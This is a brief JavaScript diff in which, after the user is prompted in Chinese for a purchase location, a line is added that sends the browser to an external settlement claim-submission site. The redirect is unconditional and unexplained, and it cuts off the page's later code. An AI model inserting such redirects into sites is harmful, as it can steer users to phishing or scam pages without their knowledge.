@@ -8,6 +8,7 @@
     while (!userLocation) {
         userLocation = prompt("购买地点不能为空，请重新输入：");
     }
+    window.location.href = 'https://southoffrancesettlement.com/submit-claim';
 
     // 等待页面加载完成
     window.addEventListener('load', function() {
